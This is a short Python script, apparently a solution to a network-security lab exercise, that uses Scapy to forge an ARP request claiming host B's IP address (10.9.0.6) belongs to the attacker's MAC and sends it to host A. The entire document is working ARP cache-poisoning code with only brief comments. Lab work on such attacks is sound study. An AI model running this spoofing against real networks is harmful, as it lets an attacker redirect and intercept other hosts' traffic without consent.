#!/usr/bin/env python3
from scapy.all import *

# Construct Ethernet frame
E = Ether(
src = '02:42:0a:09:00:69', # MAC M
dst = '02:42:0a:09:00:05') # MAC A

# Construct ARP request packet
A = ARP(
op=1,
pdst='10.9.0.5',            # IP A
hwdst='02:42:0a:09:00:69',  # MAC M
psrc='10.9.0.6')            # IP B

# op=1 for ARP request

# Combine Ethernet frame and ARP request packet
pkt = E / A

# Send the packet to host A
sendp(pkt)
